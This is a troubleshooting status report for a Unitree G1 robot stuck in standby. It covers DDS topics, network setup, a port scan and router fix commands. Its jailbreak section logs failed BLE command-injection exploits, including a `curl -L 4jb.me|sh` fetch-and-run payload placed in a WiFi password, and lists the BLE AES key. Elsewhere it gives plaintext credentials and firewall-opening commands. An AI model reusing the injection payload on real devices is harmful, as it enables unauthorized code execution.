# Current State

!!! warning "Robot is in dormant state - cannot be activated"
    The G1 locomotion board (RK3588) boots and runs all DDS services, but publishes zero data on any topic. The robot appears stuck in a boot standby state. WiFi STA mode is broken, SSH is closed, jailbreak is patched on firmware 1.4.5. The app connection is flaky (AP WiFi intermittent). Without activation via app or remote controller, the robot cannot be controlled.

## Goal

Get the robot into an active state where it can be controlled via the Unitree SDK2 over wired Ethernet DDS.

Secondary goals:
1. Get the Unitree Explore app working reliably
2. Pair the remote controller
3. Update firmware via OTA
4. Deploy RL policies from the Kingston workstation

## What Works

| Component | Status | Notes |
|-----------|--------|-------|
| Wired SSH to Jetson | Working | USB ethernet adapter, static IP 192.168.123.100, `ssh unitree@192.168.123.164`, password `123` |
| Wired ping to locomotion board | Working | 192.168.123.161, sub-ms latency |
| DDS discovery over wired | Working | 18 DDS participants, 77 topics discovered from locomotion board |
| DDS type matching | Working | Confirmed via CycloneDDS trace logs - type hashes match between SDK and firmware |
| DDS reader/writer matching | Working | `reader_add_connection` and `proxy_writer_add_connection` succeed |
| Multicast UDP packets | Working | Raw socket confirms packets arriving from 192.168.123.161 on 239.255.0.1:7401 |
| Bluetooth pairing | Working | App pairs via BLE to locomotion computer (RK3588), MAC: FC:23:CD:91:30:B4 |
| BLE protocol communication | Working | Full handshake, serial number retrieval, WiFi config commands all ACK'd. Serial: E21D6000P9GCAE |
| WG827 router admin | Working | SSH: `root` / `indr0.com`, WiFi SSID: "UnitreeRouter" / "Temp1234" (2.4GHz ch11, WPA2) |
| Internet via Mac NAT | Working | pfctl NAT on Mac (192.168.123.100), router + Jetson have internet |
| SDK installed on Jetson | Working | unitree_sdk2_python v1.0.1, CycloneDDS 0.10.2, latest git master |

## What Doesn't Work

### 1. DDS Data Flow (no samples published)

**DDS infrastructure works perfectly, but zero data is published by any process on the locomotion board.**

The `g1_estimator_runner` process registers `rt/odommodestate` (SportModeState_) as a publication, our reader matches with it, but the writer never publishes any samples. This is true for ALL 77 topics - none of them produce data.

**Tested with:**
- SDK ChannelSubscriber on `rt/odommodestate` (correct topic name, not `rt/sportmodestate`)
- SDK ChannelSubscriber on `rt/lowstate`, `rt/wirelesscontroller`
- Raw CycloneDDS DataReader with BestEffort and Reliable QoS
- Custom IDL String_ type on `rt/selftest`, `rt/servicestate`, `rt/multiplestate`
- Listened for up to 25 seconds with no data

**Root cause:** The robot is likely in a boot standby state. Services start and register DDS topics, but the control loop does not begin until activated by the app or remote controller.

### 2. SDK RPC Calls (sport service)

**LocoClient RPC calls fail with "send request error" (code 3102).**

The SDK writes to `rt/api/sport/request` but `publication_matched_count` stays 0 - there is no subscriber for that topic on the locomotion board. The sport API server does not appear to be running or accepting external requests.

Note: Writing Request_ type objects causes **segfaults** on CycloneDDS 0.10.2 (ARM64). This affects direct DDS writes and the bashrunner service.

### 3. WiFi/STA Mode (locomotion board joining external WiFi)

**Extensively tested - confirmed broken.** The locomotion board accepts WiFi credentials via BLE but never actually connects to any WiFi network.

**Tested with:**
- Unitree app on iPad (generic error: "check if WiFi password is correct...")
- Phone hotspot (same failure)
- Custom BLE script from Jetson via gatttool (all 6 BLE instructions ACK'd successfully, router logs show no connection attempt)
- WG827 router WiFi "UnitreeRouter" / "Temp1234" (2.4GHz, WPA2, no special characters)

**Router DHCP leases** only ever show the iPad. The locomotion board never requests a DHCP lease. The WiFi chip on the locomotion board may be hardware-broken or firmware-disabled.

### 4. Jailbreak (SSH access to locomotion board)

**Both UniPWN and FreeBOT exploits fail - firmware 1.4.5 is patched.** Both use the same underlying BLE command injection vulnerability (CVE-2025-35027). The `system()` call in the WiFi configuration thread no longer executes injected commands.

**Tested with:**
- UniPWN v2.6 from Mac via bleak (BLE connection issues)
- UniPWN v2.6 from Jetson via bleak (D-Bus/BlueZ could not connect to device)
- UniPWN v2.6 from Jetson with sudo (connected, full exploit ran, no SSH enabled)
- FreeBOT via app WiFi settings password injection (`curl -L 4jb.me|sh`)
- Custom gatttool exploit from Jetson (full protocol works, injection payload delivered, but `system()` call appears patched)
- Tried SSID injection and password injection
- Tried AP mode (instruction 3, data=[1]) and STA mode (instruction 3, data=[2])

**BLE protocol details:**
- Handles: ffe1 notify at 0x000d (CCCD 0x000e), ffe2 write at 0x0012
- AES key: `df98b715d5c6ed2b25817b6f2554124a`, IV: `2841ae97419c2973296a0d4bdfe19a4f`
- All instructions 1-6 work and are ACK'd

### 5. OTA Firmware Update

Cannot update firmware because:
- WiFi mode does not work (locomotion board cannot reach Unitree servers via WiFi)
- App in AP mode has no internet (192.168.12.x is isolated)
- App connection is flaky (intermittent AP WiFi, WebRTC issues)

### 6. App Connectivity (intermittent)

The Unitree Explore app is **extremely flaky**:
- AP WiFi ("UnitreeG1") sometimes does not broadcast at all
- When it does broadcast, the app sometimes cannot connect to the robot
- WebRTC services on the locomotion board may be abnormal
- The app is hardcoded to look for the robot at 192.168.12.1

### 7. Video feed (WebRTC)

All three WebRTC services are abnormal on the locomotion computer. Video streaming is broken.

## DDS Topic Discovery (77 topics)

Discovered from Jetson via CycloneDDS builtin topic readers on eth0 (192.168.123.x wired network).

### Robot State Topics

| Topic | Type | Notes |
|-------|------|-------|
| `rt/odommodestate` | SportModeState_ | Main state topic (NOT `rt/sportmodestate`) |
| `rt/lf/odommodestate` | SportModeState_ | Low-frequency variant |
| `rt/dog_odom` | Odometry_ | Odometry |
| `rt/dog_imu_raw` | Imu_ | Raw IMU |
| `rt/SymState` | SymState_ | Symmetric state |
| `rt/multiplestate` | String_ | Multiple state info |
| `rt/servicestate` | String_ | Service state |
| `rt/wirelesscontroller` | WirelessController_ | Remote controller input |

### Sensor Topics

| Topic | Type |
|-------|------|
| `rt/utlidar/cloud_livox_mid360` | PointCloud2_ |
| `rt/utlidar/imu_livox_mid360` | Imu_ |

### Hand/Dexterous Topics

| Topic | Type |
|-------|------|
| `rt/dex3/left/state` | HandState_ |
| `rt/dex3/right/state` | HandState_ |
| `rt/lf/dex3/left/state` | HandState_ |
| `rt/lf/dex3/right/state` | HandState_ |

### SLAM/Navigation Topics

| Topic | Type |
|-------|------|
| `rt/unitree/slam_mapping/odom` | Odometry_ |
| `rt/unitree/slam_mapping/points` | PointCloud2_ |
| `rt/unitree/slam_relocation/odom` | Odometry_ |
| `rt/unitree/slam_relocation/points` | PointCloud2_ |
| `rt/unitree/slam_relocation/global_map` | PointCloud2_ |
| `rt/gridmap` | GridMap_ |
| `rt/global_map` | OccupancyGrid_ |
| `rt/planner_map` | GridMap_ |
| `rt/grid_clouds` | PointCloud2_ |
| `rt/ele_clouds` | PointCloud2_ |
| `rt/collision_clouds` | PointCloud2_ |
| `rt/safe_clouds` | PointCloud2_ |
| `rt/slam_info` | String_ |
| `rt/slam_key_info` | String_ |
| `rt/unitree_slam/waypoints` | String_ |

### RPC Services (request/response)

| Service | Request Topic | Response Topic |
|---------|--------------|----------------|
| Sport | `rt/api/sport/request` | `rt/api/sport/response` |
| Loco | `rt/api/loco/request` | `rt/api/loco/response` |
| Motion Switcher | `rt/api/motion_switcher/request` | `rt/api/motion_switcher/response` |
| Robot State | `rt/api/robot_state/request` | `rt/api/robot_state/response` |
| Config | `rt/api/config/request` | `rt/api/config/response` |
| Video Hub | `rt/api/videohub/request` | - |
| Audio Hub | - | `rt/api/audiohub/response` |
| Voice | `rt/api/voice/request` | `rt/api/voice/response` |
| Arm | `rt/api/arm/request` | - |
| Gesture | `rt/api/gesture/request` | - |
| SLAM Operate | `rt/api/slam_operate/request` | `rt/api/slam_operate/response` |
| Bash Runner | - | `rt/api/bashrunner/response` |
| GPT | `rt/api/gpt/request` | `rt/api/gpt/response` |
| Dex3 Controller | - | `rt/api/dex3_msg_controller/response` |
| Robot Type | - | `rt/api/robot_type_service/response` |

### Other Topics

| Topic | Type |
|-------|------|
| `rt/selftest` | String_ |
| `rt/webrtcreq` | String_ |
| `rt/audio_msg` | String_ |
| `rt/audio_msg/filter` | String_ |
| `rt/gpt_cmd` | String_ |
| `rt/gpt_state` | String_ |
| `rt/gptflowfeedback` | String_ |
| `rt/config_change_status` | ConfigChangeStatus_ |
| `rt/public_network_status` | String_ |
| `rt/log_system_outbound` | String_ |

### DDS Processes on Locomotion Board

| Process | PID | Notes |
|---------|-----|-------|
| `robot_state_service` | 1157 | Publishes robot state |
| `motion_switcher_service` | 1093 | Motion mode management |
| `g1_estimator_runner` | 1244 | Publishes odometry/state |
| `g1_voice` | 1273 | Voice control |
| `g1_dex_protocol_v2.0` | 1015, 1031 | Dexterous hand control (2 instances) |
| `unitree_slam` | 1265 | SLAM |
| `lidar_driver` | 1059 | LiDAR |
| `ros_bridge` | 1192 | ROS2 bridge |
| `LogStreamService` | 1076 | Logging |
| `robot_type_api_server` | 1167 | Robot type info |
| python3 (multiple) | 920, 933, 954, 1309 | Various Python services |

### ROS2 Service Layer (via ros_bridge)

The ros_bridge process provides ROS2 service endpoints:
- `rq/locoRequest` / `rr/locoReply`
- `rq/motion_switcherRequest` / `rr/motion_switcherReply`
- `rq/robot_stateRequest` / `rr/robot_stateReply`
- `rq/configRequest` / `rr/configReply`
- `rq/voiceRequest` / `rr/voiceReply`

## Network Topology

```
Internet
  |
Mac (en0) -- NAT via pfctl
  |
Mac (en13) 192.168.123.100 -- USB ethernet to robot
  |
  +-- Router (br-lan) 192.168.123.1 -- WG827 OpenWrt, WiFi "UnitreeRouter"
  |     |
  |     +-- iPad 192.168.123.214 (via router WiFi)
  |
  +-- Jetson (eth0) 192.168.123.164
  |     |
  |     +-- Jetson (wlan0) 192.168.12.127 (connected to robot AP WiFi, when available)
  |
  +-- Locomotion board (wired) 192.168.123.161, port 8081 (aiohttp, 404 for all paths)
        |
        +-- Locomotion board (wlan1 AP) 192.168.12.1, "UnitreeG1" (intermittent)
              |
              +-- iPad 192.168.12.x (when on robot AP)
              +-- Jetson 192.168.12.127 (via wlan0)
```

## Locomotion Board Port Scan

Scanned from both 192.168.123.x and 192.168.12.x interfaces:

| Port | Status | Service |
|------|--------|---------|
| 22 (SSH) | Closed | No SSH access |
| 80 | Closed | - |
| 8081 | Open | aiohttp/3.8.4 (Python 3.8), returns 404 for all tested paths |
| All others tested | Closed | 443, 8080, 8443, 5000, 9090, 1883, 4840, 11311 |

## SDK Details

**Installed on Jetson:**
- unitree_sdk2_python v1.0.1 (latest git master from GitHub)
- CycloneDDS 0.10.2 (required version, pinned in setup.py)
- Python 3.8

**Key SDK files:**
- `~/unitree_sdk2_python/example/g1/high_level/g1_loco_client_example.py` - interactive locomotion control
- `~/unitree_sdk2_python/example/g1/low_level/g1_low_level_example.py` - direct motor control
- `~/unitree_sdk2_python/unitree_sdk2py/g1/loco/g1_loco_client.py` - LocoClient class
- `~/unitree_sdk2_python/unitree_sdk2py/g1/loco/g1_loco_api.py` - LOCO_SERVICE_NAME = "sport"

**SDK channel naming:**
- Client request: `rt/api/{service}/request`
- Client response: `rt/api/{service}/response`

**Known SDK bug:** Writing `Request_` type objects with CycloneDDS 0.10.2 on ARM64 (Jetson) causes segfaults. The `binary` field (`sequence[uint8]`) serialization appears broken.

## Files to Clean Up

When done with robot work, remove these:

**Mac:**
- `/tmp/UniPwn/` (exploit tool + venv)
- `/tmp/unitree_gatttool_exploit.py`
- `/tmp/unitree_wifi_config.py`
- `sudo rm /etc/sudoers.d/claude-nopasswd` (passwordless sudo)

**Jetson:**
- `/tmp/UniPwn/` (exploit tool, may be cleared by reboot)
- `/tmp/unitree_wifi_config.py`
- System-wide pip packages: `sudo pip3 uninstall bleak pycryptodomex typing-extensions async-timeout dbus-fast`
- User pip packages: `pip3 uninstall --user bleak pycryptodomex typing-extensions async-timeout dbus-fast`
- Disconnect Jetson from robot AP WiFi: `sudo nmcli con delete UnitreeG1`

## Router Config (must re-apply after each robot reboot)

The WG827 router firewall blocks forwarding by default and loses its default route on reboot. Run these commands after each power cycle to give the locomotion board internet:

```bash
# SSH into router
sshpass -p 'indr0.com' ssh -o StrictHostKeyChecking=no root@192.168.123.1

# Add default route through Mac
ip route add default via 192.168.123.100 dev br-lan

# Open firewall for forwarding
iptables -P FORWARD ACCEPT
iptables -F FORWARD

# Disable ICMP redirects (prevents hairpin routing issues)
echo 0 > /proc/sys/net/ipv4/conf/br-lan/send_redirects
echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects

# Fix DNS
echo "nameserver 8.8.8.8" > /etc/resolv.conf
```

**Why this is needed:** The locomotion board uses 192.168.123.1 (router) as its default gateway. Traffic from .161 goes to the router, which forwards to the Mac (.100), which does pfctl NAT to the internet. Without the firewall fix, the router FORWARD chain has `policy DROP` and blocks all forwarded traffic.

**Verification:** Check `sudo pfctl -s state | grep 192.168.123.161` on the Mac - you should see ZeroTier and DNS connections from the locomotion board.

## Jetson DNS Fix (must re-apply after each robot reboot)

The Jetson loses DNS and default route after reboot:

```bash
sshpass -p '123' ssh -o StrictHostKeyChecking=no unitree@192.168.123.164
echo "123" | sudo -S bash -c "echo nameserver 8.8.8.8 > /etc/resolv.conf"
echo "123" | sudo -S ip route replace default via 192.168.123.100 dev eth0
```

## ZeroTier VPN (Unitree backdoor)

The locomotion board runs ZeroTier and connects to Unitree root servers when it has internet:
- root-sgp-01.zerotier.com (Singapore)
- root-zrh-01.zerotier.com (Zurich)
- root-mia-01.zerotier.com (Miami)

This is a VPN overlay that gives Unitree remote access to the robot. Confirmed by ARP table entries on the router and pfctl state table on the Mac.

## Recommended Next Steps

1. **Contact Unitree support** - provide serial E21D6000P9GCAE, describe: WiFi STA broken, app connectivity flaky, DDS services running but not publishing data. Ask if they can push firmware update via ZeroTier while robot has internet through wired NAT setup.
2. **Motherboard replacement** - TMU was already considering this. May be the fastest path to a working robot.
3. **Get the app working** - the app is flaky but sometimes connects. If it connects reliably, try pairing the remote controller and activating the robot. Once active, DDS data should flow.
4. **Try the Jetson upgrade web UI** - `http://192.168.123.164/#/` has a "Recover Last Version" button that runs `backup.zip` (231 MB). This only affects the Jetson, not the locomotion board.
5. **Rockchip USB boot mode** (last resort) - open chassis, find RK3588 recovery button, flash firmware via rkdeveloptool. Requires firmware image from Unitree or TheRoboVerse community.
